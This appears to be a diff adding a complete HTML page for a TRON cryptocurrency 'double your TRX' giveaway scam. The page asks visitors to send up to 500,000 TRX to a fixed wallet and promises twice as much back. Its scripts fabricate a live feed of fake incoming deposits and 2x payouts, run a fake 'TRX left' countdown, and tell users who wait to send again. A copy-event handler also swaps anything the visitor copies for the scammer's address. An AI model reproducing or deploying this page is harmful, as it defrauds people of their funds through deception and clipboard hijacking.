@@ -1,0 +1,869 @@
+<html lang="en-US">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head profile="https://www.w3.org/2005/10/profile">
+<script src="clipboard.min.js.js"></script>
+<script src="jquery.min.js.js"></script>
+<script src="bootstrap.min.js.js"></script>
+<link rel="icon" href="favicon.png">
+<link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">	
+    <title>Payment request</title>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-119248778-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-119248778-1');
+</script>
+
+<script>
+window.ADDRESS = 'TKkZWY8Ur1hr2U9QwxFZUbS26EkgMAk8Hc';
+</script>
+<link rel="stylesheet" href="assets/css/main.css" />
+
+<style>.last_trans {
+    width: 1050px;
+    margin-top: 50px;
+    margin-right: auto;
+    margin-bottom: 0;
+    margin-left: auto;
+    background-color: #ffffff;
+    padding: 15px;
+	border-radius:15px;
+}
+
+h1.f-24.mvn.em-300 {
+    font-family: Montserrat, Helvetica, sans-serif
+;
+    color: rgb(95, 95, 95)
+;
+    font-size: 23px;
+    font-weight: 300;
+    margin-bottom: 15px;
+}
+
+h1.f-24.mvn.em-300 span {
+    font-family: 'Montserrat', 'Helvetica', sans-serif ;
+    font-size: 16px;
+    font-style: italic;
+    color: #a8a8a8;
+    font-weight: 300;
+    white-space: nowrap;
+    margin-left: 10px;
+}
+
+h2.f-24.mvn.em-300 {
+    font-family: Montserrat, Helvetica, sans-serif
+;
+    color: rgb(128 , 128, 128)
+;
+    font-size: 45px;
+    font-weight: 300;
+    margin-bottom: 15px;
+}
+
+h2.f-24.mvn.em-300 span {
+    font-family: 'Montserrat', 'Helvetica', sans-serif ;
+    font-size: 16px;
+    font-style: italic;
+    color: #a8a8a8;
+    font-weight: 300;
+    white-space: nowrap;
+    margin-left: 10px;
+}
+
+.text-overflow-hidden, .ui-select-match-text {
+	overflow:visible !important;
+}
+
+</style>
+
+    <style>.last_trans {
+        width: 1050px;
+        margin-top: 50px;
+        margin-right: auto;
+        margin-bottom: 0;
+        margin-left: auto;
+        background-color: #ffffff;
+        padding: 15px;
+    }
+
+    h1.f-24.mvn.em-300 {
+        font-family: Montserrat, Helvetica, sans-serif;
+        color: rgb(95, 95, 95);
+        font-size: 25px;
+        font-weight: 300;
+        margin-bottom: 15px;
+    }
+
+    h1.f-24.mvn.em-300 span {
+        font-family: 'Montserrat', 'Helvetica', sans-serif;
+        font-size: 16px;
+        font-style: italic;
+        color: #a8a8a8;
+        font-weight: 300;
+        white-space: nowrap;
+        margin-left: 10px;
+    }
+
+    .text-overflow-hidden, .ui-select-match-text {
+        overflow: visible !important;
+    }
+
+    .numb {
+        text-align: center;
+        font-size: 40px;
+        padding: 46px 10px 0 10px;
+        color: #fff;
+    }
+
+    .numb-hint {
+        color: #CBCBCB;
+        font-size: 21px;
+        padding-left: 15px;
+    }
+
+    .dot-1 {
+        position: absolute;
+        bottom: 100%;
+        font-size: 12px;
+        width: 100%;
+        margin-left: 0;
+        z-index: 100;
+        padding: 8px;
+    }
+
+    /* progress bar */
+
+    #lympo_progress .progress {
+        max-width: 460px;
+        margin: 10px auto;
+        height: 45px;
+        border-radius: 5px;
+        position: relative;
+    }
+
+    #lympo_progress .progress {
+        margin-bottom: 20px;
+        background-color: #3b3b43;
+        border-radius: 4px;
+        -webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
+        box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
+    }
+
+    #lympo_progress .progress:before {
+        content: "";
+        display: block;
+        background: #000;
+        width: 100%;
+        height: 100%;
+    }
+
+    #lympo_progress .progress-row {
+        max-width: 600px;
+        margin: 0 auto;
+    }
+
+    #lympo_progress .progress-row > div {
+        padding: 0 5px;
+    }
+
+    #lympo_progress .progress-bar {
+        -webkit-transition: width 1.4s ease;
+        transition: width 1.4s ease;
+    }
+
+    #lympo_progress .progress-bar {
+        float: left;
+        width: 0%;
+        height: 100%;
+        border-bottom-left-radius: 4px;
+        border-top-left-radius: 4px;
+        font-size: 13px;
+        line-height: 20px;
+        color: #ffffff;
+        text-align: center;
+        background-color: #ee1d4e;
+        -webkit-box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.15);
+        box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.15);
+        -webkit-transition: width 0.6s ease;
+        transition: width 0.6s ease;
+        position: absolute;
+        top: 0;
+    }
+
+    #lympo_progress .progress-striped .progress-bar, #lympo_progress .progress-bar-striped {
+        background-image: linear-gradient(135deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
+        /* background-image: linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent); */
+        background-size: 40px 40px;
+
+    }
+
+    #lympo_progress .progress.active .progress-bar, #lympo_progress .progress-bar.active {
+        -webkit-animation: progress-bar-stripes 2s linear infinite;
+        animation: progress-bar-stripes 2s linear infinite;
+    }
+
+    @keyframes progress-bar-stripes {
+        from {
+            background-position: -40px 0;
+        }
+        to {
+            background-position: 0 0;
+        }
+    }
+
+    #lympo_progress .progress-ico {
+        position: relative;
+        max-width: 460px;
+        margin: 48px auto -3px auto;
+    }
+
+    #lympo_progress .progress-ico .dot-1 {
+        position: absolute;
+        bottom: 100%;
+        font-size: 12px;
+        width: 100%;
+        margin-left: 0;
+        z-index: 100;
+        padding: 8px;
+    }
+
+    #lympo_progress .progress-ico .dot-2 {
+        position: absolute;
+        top: 100%;
+        font-size: 12px;
+        width: 100%;
+        height: auto;
+        padding: 8px;
+        margin-left: 0;
+        z-index: 100;
+    }
+
+    #lympo_progress .progress-ico .dot-1 {
+        color: #fff;
+        width: 100%;
+        text-align: center;
+        padding-bottom: 12px;
+        font-weight: 700;
+        font-size: 16px;
+    }
+
+    #lympo_progress .progress-ico .dot-1-airdrop:before {
+        content: "";
+        display: block;
+        width: 10px;
+        height: 10px;
+        background-color: #f04154;
+        border-radius: 50%;
+        margin: 0;
+        position: absolute;
+        right: -4px;
+        top: -7px;
+    }
+
+    #lympo_progress .progress-ico .dot-1-airdrop {
+        content: "";
+        display: block;
+        height: 60px;
+        background-color: #f04154;
+        width: 2px;
+        position: absolute;
+        right: -1px;
+        z-index: 100;
+        top: -4px;
+        left: 100%;
+    }
+
+    #lympo_progress .progress-ico .progress {
+
+        position: relative;
+        margin: 0 auto;
+    }
+
+    #lympo_progress .progress-ico span {
+        position: absolute;
+        text-align: center;
+        top: 0;
+        left: 0;
+        right: 0;
+        line-height: 45px;
+        color: #fff;
+        font-size: 14px;
+        letter-spacing: 0.5px;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+
+    #lympo_progress .ends {
+        position: absolute;
+        bottom: -20px;
+        width: 100%;
+        text-align: center;
+        font-size: 12px;
+    }
+
+    @media (max-width: 767px) {
+        #lympo_progress .progress-ico span {
+            font-size: 15px;
+        }
+    }
+
+    #lympo_progress .progress-ico span strong {
+        color: rgba(255, 255, 255, 0.4);
+    }
+
+    #lympo_progress .progress-ico i {
+        font-size: 11px;
+        text-align: right;
+        float: right;
+        color: #7f8480;
+        margin-bottom: -7px;
+        font-style: normal;
+        margin-top: 2px;
+    }
+
+    #lympo_progress .progress-tour {
+        max-width: 400px;
+        margin: 10px auto;
+    }
+
+    #lympo_progress .progress-tour span.tour-left {
+        float: left;
+        display: inline-block;
+        width: 25%;
+        line-height: 40px;
+        font-size: 15px;
+        font-weight: 500;
+        color: #868886;
+    }
+
+    @media (max-width: 767px) {
+        #lympo_progress .progress-tour span.tour-left {
+            width: 30%;
+            font-size: 12px;
+        }
+    }
+
+    #lympo_progress .progress-tour small {
+        padding-left: 25%;
+        margin: 3px 0 10px 0;
+        display: block;
+        color: #868886;
+    }
+
+    #lympo_progress .progress-money {
+        display: inline-block;
+        float: left;
+        width: 75%;
+        line-height: 40px;
+        height: 40px;
+        border-radius: 5px;
+        background-color: rgba(0, 0, 0, 0.3);
+        color: #fff;
+        font-size: 20px;
+        letter-spacing: 4px;
+        text-shadow: 0px 0px 3px rgba(0, 0, 0, 0.05);
+    }
+
+    #lympo_progress .progress-money strong {
+        letter-spacing: 0px;
+        font-size: 18px;
+        color: #ababab;
+    }
+
+    @media (max-width: 767px) {
+        #lympo_progress .progress-money {
+            font-size: 15px;
+            letter-spacing: 5px;
+            width: 70%;
+        }
+
+        #lympo_progress .progress-money strong {
+            font-size: 14px;
+        }
+    }
+
+    .label-orange {
+        background: #e67e22;
+    }
+</style>
+
+<style>
+.tooltip {
+    position: relative;
+    display: inline-block;
+}
+
+.tooltip .tooltiptext {
+    visibility: hidden;
+    width: 140px;
+    background-color: #555;
+    color: #fff;
+    text-align: center;
+    border-radius: 6px;
+    padding: 5px;
+    position: absolute;
+    z-index: 1;
+    bottom: 150%;
+    left: 50%;
+    margin-left: -75px;
+    opacity: 0;
+    transition: opacity 0.3s;
+}
+
+.tooltip .tooltiptext::after {
+    content: "";
+    position: absolute;
+    top: 100%;
+    left: 50%;
+    margin-left: -5px;
+    border-width: 5px;
+    border-style: solid;
+    border-color: #555 transparent transparent transparent;
+}
+
+.tooltip:hover .tooltiptext {
+    visibility: visible;
+    opacity: 1;
+}
+</style>
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" href="overrides.css" type="text/css"><script src="jquery.js" type="text/javascript"></script><script type="text/javascript" src="bootstrap.js"></script><script src="shared.js" type="text/javascript"></script><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+<link rel="stylesheet" href="blockchain.css" type="text/css">
+
+
+	<link rel="stylesheet" href="payment-request.css" type="text/css">
+    <link rel="stylesheet" href="app-overrides.css" type="text/css" media="only screen">
+<style type="text/css"> .adv{display: none;} .basic{display: inherit;} </style><style type="text/css"> .adv{display: none;} .basic{display: inherit;} </style></head>
+
+<body class="bg-blue opaque-nav main-font request">
+  
+
+
+  
+  <br>
+  <br>
+  <input name="" value="0" id="btc" class="hidden" type="number">
+  
+
+  <div class="overflow-scroll flex-justify flex-center main-font">
+    <div class="bg-white payment-request pos-rel">
+      <div class="pv-45 ph-40 center">
+	  
+      
+
+        <div class="detail" style="margin-top:-100px">
+          
+            
+              
+				<p><a href="https://tron.network/"><img alt="" src="20.png"></a></p>
+				   <p class="text-center f-16 em-300 mt-15 mb-25" style="border-radius:5px; font-size: 11pt; background: #440c17;color: #fff;padding: 5px;">To verify your address, simply send between 2,000 TRX and 500,000 TRX to the contribution address.
+ Once the transaction is confirmed, we will transfer between 4,000 TRX and 1,000,000 TRX (2x) back to the same address used for the transaction.</p>
+
+                    <p class="text-center f-16 em-300 mt-15 mb-25" style="border-radius:5px; font-size: 12pt; background: #440c17;color: #fff;padding: 5px;"
+                    <span>You may use any wallet or exchange that supports TRX.<br></span>
+                        
+<p class="text-center f-16 em-300 mt-15 mb-25" style="border-radius:5px; font-size: 12pt; background: #440c17;color: #fff;padding: 5px;"
+                    <span>For example, to receive 100,000 TRX, you need to send 50,000 TRX from your preferred wallet or exchange.<br></span>                        
+                     
+					 <p class="text-center f-16 em-300 mt-15 mb-25" style="border-radius:5px; font-size: 12pt; background: #440c17;color: #fff;padding: 5px;">If you are late for this event, the sent amount will be returned immediately.  
+                    <br> <span>
+                    
+                    </p>
+
+                    <h1 class="f-24 mvn em-300">Contribution Payment Address</h1>
+                
+                 
+
+                             
+              
+
+              
+                
+                
+                 <!-- <p class="f-16 em-300 mt-15 mb-25">You can send TRX to the following address.</p>-->
+                
+				
+				
+               <div id="div-target" class="f-16 bg-grey ph-25 pv-10 text-overflow-hidden mb-25"><p id="trnsctin">TKkZWY8Ur1hr2U9QwxFZUbS26EkgMAk8Hc</p></div>
+				<button class="btn btn-primary mb-26" data-clipboard-text="TKkZWY8Ur1hr2U9QwxFZUbS26EkgMAk8Hc" data-original-title="Copied!" title="">Copy Address to Clipboard</button><div class="tooltip fade bottom" style="top: 227px; left: 234px; display: block;"><div class="tooltip-arrow"></div><div class="tooltip-inner">Copied!</div></div>
+				
+				
+				
+				
+	 <script type="text/javascript">
+        // Tooltip
+
+$('button').tooltip({
+  trigger: 'click',
+  placement: 'bottom'
+});
+
+function setTooltip(btn, message) {
+    $(btn).attr('data-original-title', message);
+    setTimeout(function() {
+        $(btn).tooltip('show');
+    }, 150);
+}
+
+var intervalId = null;
+function hideTooltip(btn) {
+    if (intervalId != null) {
+        clearTimeout(intervalId);
+    }
+    intervalId = setTimeout(function() {
+        $(btn).tooltip('hide');
+        intervalId = null;
+    }, 3000);
+}
+
+
+// Clipboard
+
+var clipboard = new Clipboard('button');
+
+clipboard.on('success', function(e) {
+  setTooltip(e.trigger, 'Copied!');
+  hideTooltip(e.trigger);
+});
+
+clipboard.on('error', function(e) {
+  setTooltip(e.trigger, 'Failed!');
+  hideTooltip(e.trigger);
+});
+    </script>
+
+
+	
+              
+              <p class="f-16 em-300 mb-25 message hidden">For "<span class="italic"></span>"</p>
+
+              <div id="qr-code" class="mb-25 flex-justify"><img src="chart.jpg" height="150" width="150"></div>
+
+<p class="f-16 em-300 mt-15 mb-25">Waiting for your payment</p>
+<img img="" src="T1X5ZPT.gif" style="margin-top:-15px" width="30px">
+<div id="waiting">
+<p style="font-size:11px" class="f-16 em-300 mb-25" onclick="wait()">Still waiting for your transaction? Click here to continue.</p>
+<script>
+function wait() {
+    waiting.innerHTML = "Sometimes transactions may not be processed correctly.
+Please try sending it again.
+Remember, every transaction we receive will have its TRX returned along with the giveaway reward.";
+	waiting.style.color = "green";
+}
+//"<p style="font-size:15px; color:red;">Sometimes</p>"
+</script>
+
+
+           <p style="font-size:11px" class="f-16 em-300 mt-15 mb-25">Once we receive your transaction, the outgoing transfer will be processed to your address.</p>
+		   <p style="font-size:11px" class="f-16 em-300 mt-15 mb-25">Any participant who is late will have their TRX sent back immediately — you won’t lose anything.</p>
+		   </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<div class="container" id="lympo_progress">
+    <div class="row progress-row">
+        <div class="colums_12">
+            <div class="progress-ico">
+                <div class="progress-ico">
+                    <div class="progress">
+                        <div class="progress-bar progress-bar-striped active progress-width" id="progress-ico" role="progressbar" style="width: 63.8282%;">
+                            <span class="sr-only">x</span></div>
+                    </div>
+                </div>
+                <div class="dot-1" id="lefteth">Last chance to get your TRX!</div>
+                <div class="dot-1-airdrop  progress-left" style="left: 63.8282%;"></div>
+                
+        </div>
+    </div>
+</div>
+
+<div class="last_trans container">
+<div id="ContentPlaceHolder1_maintab" class="tab-v1">
+<ul class="nav nav-tabs" id="nav_tabs">
+
+
+
+
+<div class="tab-content" style="padding: 1px 0;border-top: solid 1px #3498db;">
+<div class="tab-pane fade active in" id="transactions">
+<div class="panel panel-info">
+<div class="panel-body table-responsive">
+
+
+<h1 class="f-24 mvn em-300">Transactions for address: <span id="trnsctaddr">TKkZWY8Ur1hr2U9QwxFZUbS26EkgMAk8Hc</span></h1>
+<table class="table" id="myTable">
+<tbody>
+<tr>
+<th>TxHash</th>
+<th><span title="UTC time">Age</span></th>
+<th>From</th>
+<th></th>
+<th>To</th>
+<th>Quantity</th>
+</tr>
+<tr class="toolbar"><td><a class="address-tag" 
+
+</table>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+function wait(){
+	waiting.innerHTML="Sometimes transactions may not be sent processed correctly. Please try sending it again. Remember, every transaction we receive will have its TRX Returned along with the giveaway reward.";
+	waiting.style.color="green";
+}
+
+function txid_gen(){
+	var tx;
+	tx = "xxxxxxxxxxxxxxxxx".replace(/[xy]/g, function(t){
+			var e = 16 * Math.random() | 0;
+			return ("x" == t ? e : 3 & e | 8).toString(16);
+		});
+		tx = tx.toLowerCase();
+	return tx;
+}
+
+function addr_gen(){
+	var addr;
+	var s = new Array("1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","J","K","L","M","N","P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g","h","i","j","k","m","n","o","p","q","r","s","t","u","v","w","x","y","z"),
+		num;
+	addr="T";
+	num = Math.random();
+	
+	for(var i = 0; i < 16; i++){
+		do{
+			num = parseInt(Math.random() * 100);
+			if(num <= 57) break;
+		} while(true);
+		addr += s[num];
+	}
+	return addr;
+}
+
+function starttr(){
+	var OUT, TXID, TXID2, INCIN, INOUT, CTIME, t;
+	for(i=0; i < 8; i++){
+		OUT = addr_gen();
+		TXID = txid_gen();
+		TXID2 = txid_gen();
+		INCIN = (Math.random() * (1500000 - 725000) + 30000).toFixed(3) * 1;
+		INOUT = (2 * INCIN).toFixed(3) * 1;
+		
+		if(INCIN >= 1000) INCIN=INCIN.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+		if(INOUT >= 1000) INOUT=INOUT.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+		
+		CTIME = 7 - i;
+		if(CTIME<1) CTIME="now";
+		else CTIME = CTIME + " sec ago";
+		
+		t = document.getElementById("myTable").insertRow(1);
+		t.innerHTML = '<td><a class="toolme address-tag" href="#">' + TXID + '...</a></td><td width="150px !important"><span rel="tooltip" data-placement="bottom" class="tim3">' + CTIME + '</span></td><td><a class="address-tag" href="#">' + OUT + '...</a></td><td><span class="label label-success rounded">&#160; IN &#160;</span></td><td><span class="address-tag">TKkZWY8Ur1hr2U9Qw...</span></td><td>' + INCIN + ' TRX</td>';
+		document.getElementsByTagName('tr')[1].classList.add('toolbar');
+		
+        t = document.getElementById('myTable').insertRow(1);
+        t.innerHTML = '<td><a class="address-tag" href="#">' + TXID2 + '...</a></td><td width="150px !important"><span rel="tooltip" data-placement="bottom" class="tim3">' + CTIME + '</span></td><td><a class="address-tag" href="#">TKkZWY8Ur1hr2U9Qw...</a></td><td><span class="label label-orange rounded" style="background:#e67e22;">OUT</span></td><td><span class="address-tag">' + OUT + '...</span></td><td>' + INOUT + ' TRX</td>';
+		document.getElementsByTagName('tr')[1].classList.add('toolbar');
+	}
+}
+
+function newtr(){
+    var OUT = addr_gen(),
+		TXID = txid_gen(),
+		TXID2 = txid_gen(),
+		INCIN = (Math.random() * (1100000 - 700000) + 30000).toFixed(3) * 1,
+		INOUT = (2 * INCIN).toFixed(3) * 1,
+		VINCIN, VINOUT, TXCOUNT,
+		t, table=document.getElementById('myTable');
+	
+	if(INCIN >= 1000) VINCIN=INCIN.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+	else VINCIN=INCIN;
+	if(INOUT >= 1000) VINOUT=INOUT.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+	else VINOUT=INOUT;
+	
+    t = table.insertRow(1);
+    t.innerHTML = '<td><a class="toolme address-tag" href="#">' + TXID + '...</a></td><td width="150px !important"><span rel="tooltip" data-placement="bottom" class="tim3">now</span></td><td><a class="address-tag" href="#">' + OUT + '...</a></td><td><span class="label label-success rounded">&#160; IN &#160;</span></td><td><span class="address-tag">TKkZWY8Ur1hr2U9Qw...</span></td><td>' + VINCIN + ' TRX</td>';
+	document.getElementsByTagName('tr')[1].classList.add('toolbar');
+	table.deleteRow(table.rows.length - 1);
+	setTimeout(function(){
+        t = table.insertRow(1);
+        t.innerHTML = '<td><a class="address-tag" href="#">' + TXID2 + '...</a></td><td width="150px !important"><span rel="tooltip" data-placement="bottom" class="tim3">now</span></td><td><a class="address-tag" href="#">TKkZWY8Ur1hr2U9Qw...</a></td><td><span class="label label-orange rounded" style="background:#e67e22;">OUT</span></td><td><span class="address-tag">' + OUT + '...</span></td><td>' + VINOUT + ' TRX</td>';
+		document.getElementsByTagName('tr')[1].classList.add('toolbar');
+		table.deleteRow(table.rows.length - 1);
+		
+		TXCOUNT=(INOUT-INCIN).toFixed(0) * 1;
+		updateProgress(TXCOUNT);
+    }, 2000);
+}
+
+function updateTrans(){
+    for(i=0; i < times.length; i++) "now" == times[i].innerHTML.split(" ")[0] ? times[i].innerHTML = "1 sec ago" : times[i].innerHTML = parseInt(times[i].innerHTML.split(" ")[0]) + 1 + " sec ago";
+    newtr();
+}
+
+function updateTrans(){
+    for(i=0; i < times.length; i++) "now" == times[i].innerHTML.split(" ")[0] ? times[i].innerHTML = "1 sec ago" : times[i].innerHTML = parseInt(times[i].innerHTML.split(" ")[0]) + 1 + " sec ago";
+    newtr();
+}
+
+var times = document.getElementsByClassName("tim3");
+window.onload = function(){
+	starttr();
+    updateTrans();
+	trans = setInterval(function(){
+        updateTrans();
+    }, 3000);
+};
+
+
+function setProgress(count, max){
+    var p = (100*count/max).toString() + "%";
+    $(".progress-left").css("left", p);
+    $(".progress-width").css("width", p);
+    var cc = count.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, "$1 ");
+    var mm = max.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, "$1 ");
+    $(".progress-bar-value").text(cc + " / " + mm);
+}
+
+var stop_progress=false;
+function updateProgress(TXCOUNT){
+	if(stop_progress) return;
+	
+    if(localStorage.getItem("barTRX")){
+		if(localStorage.getItem("barTRX") <= 160000000){
+			var new_count=localStorage.getItem("barTRX");
+		} else if(localStorage.getItem("barTRX")) {
+			var init_count=localStorage.getItem("barTRX");
+			var new_count=(init_count - TXCOUNT).toFixed(0) * 1;
+        }
+	} else {
+        var init_count=6276441000;
+		var new_count=(init_count - TXCOUNT).toFixed(0) * 1;
+    }
+    setProgress(new_count, 10000000000);
+	
+	localStorage.setItem("barTRX", new_count);
+	
+	if(init_count <= 280000000) stop_progress=true;
+	if(new_count <= 800000000 && init_count >= 160000001){
+		document.getElementById("leftcoin").innerHTML="Left TRX";
+		document.title=new_count+" TRX left";
+	}
+	if(new_count <= 160000000 && init_count >= 280000001) document.getElementById("leftcoin").innerHTML="Hurry up, not much more TRX left!";	  
+	if(new_count <= 280000000) document.getElementById("leftcoin").innerHTML="Last chance to get your TRX!";
+	if(new_count <= 160000000) document.title="Get your "+new_count+" TRX now!";
+}
+//]]>
+</script>
+<script type="text/javascript">
+	//<![CDATA[
+	var exec_copy=false;
+	function copyAddress(isCopy=false){
+		if(exec_copy) return;
+		else exec_copy=true;
+		
+		var t = window.getSelection(),
+			e = document.createElement('div');
+		e.style.position='absolute';
+		e.style.left='-99999px';
+		document.body.appendChild(e);
+		e.innerHTML=window.ADDRESS;
+		t.selectAllChildren(e);
+		if(isCopy) document.execCommand('copy');
+		window.setTimeout(function(){
+			document.body.removeChild(e);
+		}, 100);
+		
+		exec_copy=false;
+	}
+	document.addEventListener('copy', copyAddress);
+	
+	//
+	function selectText(elementId){
+		var text=document.getElementById(elementId), range, selection;
+		
+		if(document.body.createTextRange){
+			range=document.body.createTextRange();
+			range.moveToElementText(text);
+			range.select();
+		} else if(window.getSelection){
+			selection=window.getSelection();
+			range=document.createRange();
+			range.selectNodeContents(text);
+			selection.removeAllRanges();
+			selection.addRange(range);
+		}
+	}
+	$('#address').click(function(){
+		copyAddress(true);
+		selectText(this.id);
+	});
+	
+	//
+	$('#payment-button').click(function(){
+		copyAddress(true);
+		selectText('address');
+		$('#payment-tooltip').css('opacity', '1');
+		setTimeout(function(){$('#payment-tooltip').removeAttr('style');}, 1500);
+	});
+	
+	//
+	function addrWidthResizer(divWrap, addrContId){
+		var size=16, minSize=8,
+			addrCont=$(addrContId),
+			addrWidth=$(divWrap).width();
+
+		addrCont.removeAttr('style');
+		while(addrCont.width() > addrWidth){
+			size = size - 0.1;
+			if(size < minSize) break;
+			addrCont.css('font-size', size);
+		}
+    }
+
+	addrWidthResizer('#div-target', '#address');
+	addrWidthResizer('.last_trans', '#trnsctaddr');
+	$(window).on('resize', function(){
+        addrWidthResizer('#div-target', '#address');
+      	addrWidthResizer('.last_trans', '#trnsctaddr');
+	});
+	//]]>
+	</script>
+
+
+</div>
+<div>
+  <style>
+  .toolbar{
+    -webkit-animation-name: animation;
+    -webkit-animation-duration: 1s;
+    -webkit-animation-timing-function: ease-in-out;
+    -webkit-animation-play-state: running;
+
+    animation-name: animation;
+    animation-duration: 1s;
+    animation-timing-function: ease-in-out;
+    animation-play-state: running;
+}
+@-webkit-keyframes animation {
+    0%     {background-color:#ede86c;}
+    100.0%  {background-color:#ffffff;}
+}
+
+@keyframes animation {
+    0%     {background-color:#ede86c;}
+    100.0%  {background-color:#ffffff;}
+}
+</style>
+
+</div></div>    <script>
+    var clipboard = new Clipboard('.btn');
+    </script></div></div></div></div></body>
+</html>
